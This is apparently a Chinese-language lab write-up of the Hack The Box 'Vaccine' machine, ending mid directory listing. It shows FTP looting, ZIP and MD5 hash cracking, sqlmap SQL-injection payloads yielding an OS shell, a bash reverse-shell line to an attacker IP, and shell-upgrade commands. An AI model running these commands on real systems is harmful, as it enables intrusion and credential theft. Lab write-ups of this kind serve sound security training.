01:48 EDT\nNmap scan report for 10.129.103.172\nHost is up (0.42s latency).\nNot shown: 944 closed tcp ports (reset), 53 filtered tcp ports (no-response)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.10.14.54\n|      Logged in as ftpuser\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 3\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 c0ee58077534b00b9165b259569527a4 (RSA)\n|   256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)\n|_  256 425bc321dfefa20bc95e03421d69d028 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: MegaCorp Login\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 261.22 seconds\n```\n\n发现FTP允许匿名登录：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# ftp 10.129.103.172\nConnected to 10.129.103.172.\n220 (vsFTPd 3.0.3)\nName (10.129.103.172:kali): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> dir\n229 Entering Extended Passive Mode (|||10156|)\n150 Here comes the directory listing.\n-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip\n226 Directory send OK.\nftp> get backup.zip\nlocal: backup.zip remote: backup.zip\n229 Entering Extended Passive Mode (|||10939|)\n150 Opening BINARY mode data connection for backup.zip (2533 bytes).\n100% |************************************|  2533        8.59 MiB/s    00:00 ETA\n226 Transfer complete.\n2533 bytes received in 00:00 (16.95 KiB/s)\nftp> exit\n221 Goodbye.\n                                                                                 \n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# unzip backup.zip \nArchive:  backup.zip\n[backup.zip] index.php password: \npassword incorrect--reenter:\n```\n\n下载下来buckup.zip，解压发现需要密码，尝试简单密码后发现不行，直接开膛手crack：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# john --help                                      \nJohn the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]\nCopyright (c) 1996-2021 by Solar Designer and others\nHomepage: https://www.openwall.com/john/\n\nUsage: john [OPTIONS] [PASSWORD-FILES]\n\n--help                     Print usage summary\n--single[=SECTION[,..]]    \"Single crack\" mode, using default or named rules\n--single=:rule[,..]        Same, using \"immediate\" rule(s)\n--single-seed=WORD[,WORD]  Add static seed word(s) for all salts in single mode\n--single-wordlist=FILE     *Short* wordlist with static seed words/morphemes\n--single-user-seed=FILE    Wordlist with seeds per username (user:password[s]\n                           format)\n--single-pair-max=N        Override max. number of word pairs generated (6)\n--no-single-pair           Disable single word pair generation\n--[no-]single-retest-guess Override config for SingleRetestGuess\n--wordlist[=FILE] --stdin  Wordlist mode, read words from FILE or stdin\n                  --pipe   like --stdin, but bulk reads, and allows rules\n--rules[=SECTION[,..]]     Enable word mangling rules (for wordlist or PRINCE\n                           modes), using default or named rules\n--rules=:rule[;..]]        Same, using \"immediate\" rule(s)\n--rules-stack=SECTION[,..] Stacked rules, applied after regular rules or to\n                           modes that otherwise don't support rules\n--rules-stack=:rule[;..]   Same, using \"immediate\" rule(s)\n--rules-skip-nop           Skip any NOP \":\" rules (you already ran w/o rules)\n--loopback[=FILE]          Like --wordlist, but extract words from a .pot file\n--mem-file-size=SIZE       Size threshold for wordlist preload (default 2048 MB)\n--dupe-suppression         Suppress all dupes in wordlist (and force preload)\n--incremental[=MODE]       \"Incremental\" mode [using section MODE]\n--incremental-charcount=N  Override CharCount for incremental mode\n--external=MODE            External mode or word filter\n--mask[=MASK]              Mask mode using MASK (or default from john.conf)\n--markov[=OPTIONS]         \"Markov\" mode (see doc/MARKOV)\n--mkv-stats=FILE           \"Markov\" stats file\n--prince[=FILE]            PRINCE mode, read words from FILE\n--prince-loopback[=FILE]   Fetch words from a .pot file\n--prince-elem-cnt-min=N    Minimum number of elements per chain (1)\n--prince-elem-cnt-max=[-]N Maximum number of elements per chain (negative N is\n                           relative to word length) (8)\n--prince-skip=N            Initial skip\n--prince-limit=N           Limit number of candidates generated\n--prince-wl-dist-len       Calculate length distribution from wordlist\n--prince-wl-max=N          Load only N words from input wordlist\n--prince-case-permute      Permute case of first letter\n--prince-mmap              Memory-map infile (not available with case permute)\n--prince-keyspace          Just show total keyspace that would be produced\n                           (disregarding skip and limit)\n--subsets[=CHARSET]        \"Subsets\" mode (see doc/SUBSETS)\n--subsets-required=N       The N first characters of \"subsets\" charset are\n                           the \"required set\"\n--subsets-min-diff=N       Minimum unique characters in subset\n--subsets-max-diff=[-]N    Maximum unique characters in subset (negative N is\n                           relative to word length)\n--subsets-prefer-short     Prefer shorter candidates over smaller subsets\n--subsets-prefer-small     Prefer smaller subsets over shorter candidates\n--make-charset=FILE        Make a charset, FILE will be overwritten\n--stdout[=LENGTH]          Just output candidate passwords [cut at LENGTH]\n--session=NAME             Give a new session the NAME\n--status[=NAME]            Print status of a session [called NAME]\n--restore[=NAME]           Restore an interrupted session [called NAME]\n--[no-]crack-status        Emit a status line whenever a password is cracked\n--progress-every=N         Emit a status line every N seconds\n--show[=left]              Show cracked passwords [if =left, then uncracked]\n--show=formats             Show information about hashes in a file (JSON)\n--show=invalid             Show lines that are not valid for selected format(s)\n--test[=TIME]              Run tests and benchmarks for TIME seconds each\n                           (if TIME is explicitly 0, test w/o benchmark)\n--stress-test[=TIME]       Loop self tests forever\n--test-full=LEVEL          Run more thorough self-tests\n--no-mask                  Used with --test for alternate benchmark w/o mask\n--skip-self-tests          Skip self tests\n--users=[-]LOGIN|UID[,..]  [Do not] load this (these) user(s) only\n--groups=[-]GID[,..]       Load users [not] of this (these) group(s) only\n--shells=[-]SHELL[,..]     Load users with[out] this (these) shell(s) only\n--salts=[-]COUNT[:MAX]     Load salts with[out] COUNT [to MAX] hashes, or\n--salts=#M[-N]             Load M [to N] most populated salts\n--costs=[-]C[:M][,...]     Load salts with[out] cost value Cn [to Mn]. For\n                           tunable cost parameters, see doc/OPTIONS\n--fork=N                   Fork N processes\n--node=MIN[-MAX]/TOTAL     This node's number range out of TOTAL count\n--save-memory=LEVEL        Enable memory saving, at LEVEL 1..3\n--log-stderr               Log to screen instead of file\n--verbosity=N              Change verbosity (1-5 or 6 for debug, default 3)\n--no-log                   Disables creation and writing to john.log file\n--bare-always-valid=Y      Treat bare hashes as valid (Y/N)\n--catch-up=NAME            Catch up with existing (paused) session NAME\n--config=FILE              Use FILE instead of john.conf or john.ini\n--encoding=NAME            Input encoding (eg. UTF-8, ISO-8859-1). See also\n                           doc/ENCODINGS.\n--input-encoding=NAME      Input encoding (alias for --encoding)\n--internal-codepage=NAME   Codepage used in rules/masks (see doc/ENCODINGS)\n--target-encoding=NAME     Output encoding (used by format)\n--force-tty                Set up terminal for reading keystrokes even if we're\n                           not the foreground process\n--field-separator-char=C   Use 'C' instead of the ':' in input and pot files\n--[no-]keep-guessing       Try finding plaintext collisions\n--list=WHAT                List capabilities, see --list=help or doc/OPTIONS\n--length=N                 Shortcut for --min-len=N --max-len=N\n--min-length=N             Request a minimum candidate length in bytes\n--max-length=N             Request a maximum candidate length in bytes\n--max-candidates=[-]N      Gracefully exit after this many candidates tried.\n                           (if negative, reset count on each crack)\n--max-run-time=[-]N        Gracefully exit after this many seconds (if negative,\n                           reset timer on each crack)\n--mkpc=N                   Request a lower max. keys per crypt\n--no-loader-dupecheck      Disable the dupe checking when loading hashes\n--pot=NAME                 Pot file to use\n--regen-lost-salts=N       Brute force unknown salts (see doc/OPTIONS)\n--reject-printable         Reject printable binaries\n--tune=HOW                 Tuning options (auto/report/N)\n--subformat=FORMAT         Pick a benchmark format for --format=crypt\n--format=[NAME|CLASS][,..] Force hash of type NAME. The supported formats can\n                           be seen with --list=formats and --list=subformats.\n                           See also doc/OPTIONS for more advanced selection of\n                           format(s), including using classes and wildcards.\n```\n\nwe will have to convert the ZIP into the hash using the `zip2john` module that comes within John the Ripper：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# zip2john backup.zip > hashes\nver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8\nver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8\nNOTE: It is assumed that all files in each archive have the same password.\nIf that is not the case, the hash may be uncrackable. To avoid this, use\noption -o to pick a file at a time.\n                                                                                 \n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# cat hashes\nbackup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip\n```\n\nNow, we will type the following command: `john -wordlist=/usr/share/wordlists/rockyou.txt hashes`\nSo it will load the wordlist & it will do a bruteforce attack against the hash stored in file hashes . Once the password is cracked, we will use the --show option to display the cracked password.\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# john -wordlist=/usr/share/wordlists/rockyou.txt hashes\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n741852963        (backup.zip)     \n1g 0:00:00:00 DONE (2023-07-24 02:40) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n                                                                                 \n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# john --show hashes                                    \nbackup.zip:741852963::backup.zip:style.css, index.php:backup.zip\n\n1 password hash cracked, 0 left\n```\n\n得到密码：741852963，解压\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# unzip backup.zip\nArchive:  backup.zip\n[backup.zip] index.php password: \n  inflating: index.php               \n  inflating: style.css\n```\n\nindex.php里是什么：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# cat index.php \n<!DOCTYPE html>\n<?php\nsession_start();\n  if(isset($_POST['username']) && isset($_POST['password'])) {\n    if($_POST['username'] === 'admin' && md5($_POST['password']) === \"2cb42f8734ea607eefed3b70af13bbd3\") {\n      $_SESSION['login'] = \"true\";\n      header(\"Location: dashboard.php\");\n    }\n  }\n?>\n<html lang=\"en\" >\n<head>\n  <meta charset=\"UTF-8\">\n  <title>MegaCorp Login</title>\n  <link href=\"https://fonts.googleapis.com/css?family=Open+Sans:400,700\" rel=\"stylesheet\"><link rel=\"stylesheet\" href=\"./style.css\">\n\n</head>\n  <h1 align=center>MegaCorp Login</h1>\n<body>\n<!-- partial:index.partial.html -->\n<body class=\"align\">\n\n  <div class=\"grid\">\n\n    <form action=\"\" method=\"POST\" class=\"form login\">\n\n      <div class=\"form__field\">\n        <label for=\"login__username\"><svg class=\"icon\"><use xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"#user\"></use></svg><span class=\"hidden\">Username</span></label>\n        <input id=\"login__username\" type=\"text\" name=\"username\" class=\"form__input\" placeholder=\"Username\" required>\n      </div>\n\n      <div class=\"form__field\">\n        <label for=\"login__password\"><svg class=\"icon\"><use xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"#lock\"></use></svg><span class=\"hidden\">Password</span></label>\n        <input id=\"login__password\" type=\"password\" name=\"password\" class=\"form__input\" placeholder=\"Password\" required>\n      </div>\n\n      <div class=\"form__field\">\n        <input type=\"submit\" value=\"Sign In\">\n      </div>\n\n    </form>\n\n  </div>\n\n  <svg xmlns=\"http://www.w3.org/2000/svg\" class=\"icons\"><symbol id=\"arrow-right\" viewBox=\"0 0 1792 1792\"><path d=\"M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z\"/></symbol><symbol id=\"lock\" viewBox=\"0 0 1792 1792\"><path d=\"M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z\"/></symbol><symbol id=\"user\" viewBox=\"0 0 1792 1792\"><path d=\"M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z\"/></symbol></svg>\n\n</body>\n<!-- partial -->\n  \n</body>\n</html>\n```\n\n发现这行：\n\n`$_POST['username'] === 'admin' && md5($_POST['password']) === \"2cb42f8734ea607eefed3b70af13bbd3\"`\n\nusername: admin\n\npassword: `2cb42f8734ea607eefed3b70af13bbd3`\n\n根据php语句，密码是md5加密后的数据\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# hashid 2cb42f8734ea607eefed3b70af13bbd3\nAnalyzing '2cb42f8734ea607eefed3b70af13bbd3'\n[+] MD2 \n[+] MD5 \n[+] MD4 \n[+] Double MD5 \n[+] LM \n[+] RIPEMD-128 \n[+] Haval-128 \n[+] Tiger-128 \n[+] Skein-256(128) \n[+] Skein-512(128) \n[+] Lotus Notes/Domino 5 \n[+] Skype \n[+] Snefru-128 \n[+] NTLM \n[+] Domain Cached Credentials \n[+] Domain Cached Credentials 2 \n[+] DNSSEC(NSEC3) \n[+] RAdmin v2.x \n                                                                                 \n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# echo '2cb42f8734ea607eefed3b70af13bbd3' > hash           \n                                                                                 \n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt \nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n==================================================================================================================================================\n* Device #1: pthread-penryn-Intel(R) Celeron(R) N5095 @ 2.00GHz, 1433/2930 MB (512 MB allocatable), 4MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Early-Skip\n* Not-Salted\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n* Raw-Hash\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nPure kernels can crack longer passwords, but drastically reduce performance.\nIf you want to switch to optimized kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 0 MB\n\nDictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.98Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106869 bytes (47.96Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 bytes (95.9Dictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 2 secs\n\n2cb42f8734ea607eefed3b70af13bbd3:qwerty789                \n                                                          \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 0 (MD5)\nHash.Target......: 2cb42f8734ea607eefed3b70af13bbd3\nTime.Started.....: Mon Jul 24 03:30:25 2023 (0 secs)\nTime.Estimated...: Mon Jul 24 03:30:25 2023 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   387.5 kH/s (0.18ms) @ Accel:256 Loops:1 Thr:1 Vec:4\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\nProgress.........: 100352/14344385 (0.70%)\nRejected.........: 0/100352 (0.00%)\nRestore.Point....: 99328/14344385 (0.69%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: 020180 -> paashaas\nHardware.Mon.#1..: Util: 14%\n\nStarted: Mon Jul 24 03:29:30 2023\nStopped: Mon Jul 24 03:30:26 2023\n```\n\n得到结果：`qwerty789`\n\n因为80端口的缘故浏览器登录：\n\n![Untitled](D:\\Study\\security\\Vaccine cb9391dba556416cae0ccf2691de612f\\Untitled.png)\n\nsqlmap使用，在46课也有详细讲解\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# sqlmap -h\n        ___\n       __H__                                                                     \n ___ ___[,]_____ ___ ___  {1.7.2#stable}                                         \n|_ -| . [']     | .'| . |                                                        \n|___|_  [']_|_|_|__,|  _|                                                        \n      |_|V...       |_|   https://sqlmap.org                                     \n\nUsage: python3 sqlmap [options]\n\nOptions:\n  -h, --help            Show basic help message and exit\n  -hh                   Show advanced help message and exit\n  --version             Show program's version number and exit\n  -v VERBOSE            Verbosity level: 0-6 (default 1)\n\n  Target:\n    At least one of these options has to be provided to define the\n    target(s)\n\n    -u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")\n    -g GOOGLEDORK       Process Google dork results as target URLs\n\n  Request:\n    These options can be used to specify how to connect to the target URL\n\n    --data=DATA         Data string to be sent through POST (e.g. \"id=1\")\n    --cookie=COOKIE     HTTP Cookie header value (e.g. \"PHPSESSID=a8d127e..\")\n    --random-agent      Use randomly selected HTTP User-Agent header value\n    --proxy=PROXY       Use a proxy to connect to the target URL\n    --tor               Use Tor anonymity network\n    --check-tor         Check to see if Tor is used properly\n\n  Injection:\n    These options can be used to specify which parameters to test for,\n    provide custom injection payloads and optional tampering scripts\n\n    -p TESTPARAMETER    Testable parameter(s)\n    --dbms=DBMS         Force back-end DBMS to provided value\n\n  Detection:\n    These options can be used to customize the detection phase\n\n    --level=LEVEL       Level of tests to perform (1-5, default 1)\n    --risk=RISK         Risk of tests to perform (1-3, default 1)\n\n  Techniques:\n    These options can be used to tweak testing of specific SQL injection\n    techniques\n\n    --technique=TECH..  SQL injection techniques to use (default \"BEUSTQ\")\n\n  Enumeration:\n    These options can be used to enumerate the back-end database\n    management system information, structure and data contained in the\n    tables\n\n    -a, --all           Retrieve everything\n    -b, --banner        Retrieve DBMS banner\n    --current-user      Retrieve DBMS current user\n    --current-db        Retrieve DBMS current database\n    --passwords         Enumerate DBMS users password hashes\n    --dbs               Enumerate DBMS databases\n    --tables            Enumerate DBMS database tables\n    --columns           Enumerate DBMS database table columns\n    --schema            Enumerate DBMS schema\n    --dump              Dump DBMS database table entries\n    --dump-all          Dump all DBMS databases tables entries\n    -D DB               DBMS database to enumerate\n    -T TBL              DBMS database table(s) to enumerate\n    -C COL              DBMS database table column(s) to enumerate\n\n  Operating system access:\n    These options can be used to access the back-end database management\n    system underlying operating system\n\n    --os-shell          Prompt for an interactive operating system shell\n    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC\n\n  General:\n    These options can be used to set some general working parameters\n\n    --batch             Never ask for user input, use the default behavior\n    --flush-session     Flush session files for current target\n\n  Miscellaneous:\n    These options do not fit into any other category\n\n    --wizard            Simple wizard interface for beginner users\n\n[!] to see full list of options run with '-hh'\n```\n\n因cookie身份认证问题，\n\n需下载插件，cookie编辑器：\n\n<aside>\n🔒 For Google:\n[https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm)\nFor Firefox:\n[https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/)\n\n\n</aside>\n\n![Untitled](D:\\Study\\security\\Vaccine cb9391dba556416cae0ccf2691de612f\\Untitled 1.png)\n\n啊反复了几次，这次终于拿到了：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# sqlmap -u 'http://10.129.103.172/dashboard.php?search=any+query' --cookie=\"PHPSESSID=k3e94885qhta9s4sqqskebljqq\" --os-shell\n        ___\n       __H__                                                                     \n ___ ___[']_____ ___ ___  {1.7.2#stable}                                         \n|_ -| . [\"]     | .'| . |                                                        \n|___|_  [']_|_|_|__,|  _|                                                        \n      |_|V...       |_|   https://sqlmap.org                                     \n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 04:51:12 /2023-07-24/\n\n[04:51:12] [INFO] testing connection to the target URL\n[04:51:20] [INFO] checking if the target is protected by some kind of WAF/IPS\n[04:51:21] [INFO] testing if the target URL content is stable\n[04:51:21] [INFO] target URL content is stable\n[04:51:21] [INFO] testing if GET parameter 'search' is dynamic\n[04:51:21] [WARNING] GET parameter 'search' does not appear to be dynamic\n[04:51:22] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')\n[04:51:23] [INFO] testing for SQL injection on GET parameter 'search'\nit looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y\nfor the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] y\n[04:51:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[04:52:03] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                              \n[04:52:04] [INFO] testing 'Generic inline queries'\n[04:52:04] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'                                                                    \n[04:52:07] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable                            \n[04:52:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\n[04:52:08] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable                                                      \n[04:52:08] [INFO] testing 'PostgreSQL inline queries'\n[04:52:08] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'\n[04:52:08] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)\n[04:52:21] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable                                                    \n[04:52:21] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'\n[04:52:32] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable                                                         \n[04:52:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\nGET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y\nsqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:\n---\nParameter: search (GET)\n    Type: boolean-based blind\n    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)\n    Payload: search=any query' AND (SELECT (CASE WHEN (6093=6093) THEN NULL ELSE CAST((CHR(118)||CHR(118)||CHR(87)||CHR(105)) AS NUMERIC) END)) IS NULL-- RTIw\n\n    Type: error-based\n    Title: PostgreSQL AND error-based - WHERE or HAVING clause\n    Payload: search=any query' AND 9369=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (9369=9369) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(98)||CHR(122)||CHR(113)) AS NUMERIC)-- fmXN\n\n    Type: stacked queries\n    Title: PostgreSQL > 8.1 stacked queries (comment)\n    Payload: search=any query';SELECT PG_SLEEP(5)--\n\n    Type: time-based blind\n    Title: PostgreSQL > 8.1 AND time-based blind\n    Payload: search=any query' AND 5884=(SELECT 5884 FROM PG_SLEEP(5))-- LLsP\n---\n[04:52:37] [INFO] the back-end DBMS is PostgreSQL\nweb server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)\nweb application technology: Apache 2.4.41\nback-end DBMS: PostgreSQL\n[04:52:40] [INFO] fingerprinting the back-end DBMS operating system\n[04:52:49] [INFO] the back-end DBMS operating system is Linux\n[04:52:50] [INFO] testing if current user is DBA\n[04:52:59] [INFO] retrieved: '1'\n[04:53:00] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution\n[04:53:00] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER\nos-shell>\n```\n\n`bash -c \"bash -i >& /dev/tcp/10.10.14.221/1234 0>&1\"`\n\nshan，终于连回来了：\n\n```bash\n┌──(root㉿kali)-[/home/kali]\n└─# nc -lnvp 1234\nlistening on [any] 1234 ...\nconnect to [10.10.14.54] from (UNKNOWN) [10.129.103.172] 41906\nbash: cannot set terminal process group (7060): Inappropriate ioctl for device\nbash: no job control in this shell\npostgres@vaccine:/var/lib/postgresql/11/main$\n```\n\n用nc拿到外壳后还不能TAB按键补全，使用以下命令获得完全交互式：\n\n```bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nCTRL+Z\nstty raw -echo\nfg\nexport TERM=xterm\n```\n\n翻目录可以找到user的flag：\n\n```bash\npostgres@vaccine:/var/lib/postgresql/11/main$ ls\npostgres@vaccine:/var/lib/postgresql/11/main$ cd ..\npostgres@vaccine:/var/lib/postgresql/11$ ls\nmain\npostgres@vaccine:/var/lib/postgresql/11$ cd ..\npostgres@vaccine:/var/lib/postgresql$ ls\n11  user.txt\n```\n\n```bash\npostgres@vaccine:/var/lib/postgresql$ cd /var/www/html\npostgres@vaccine:/var/www/html$ ls -la\ntotal 392\ndrwxr-xr-x 2 root root   4096 Jul 23  2021 .\ndrwxr-xr-x 3 root root   4096 Jul 23  2021 ..\n-rw-rw-r-- 1 root root 362847 Feb  3  2020 bg.png\n-rw-r--r-- 1 root root   4723 Feb  3  2020 dashboard.css\n-rw-r--r-- 1 root root     50 Jan 30  2020 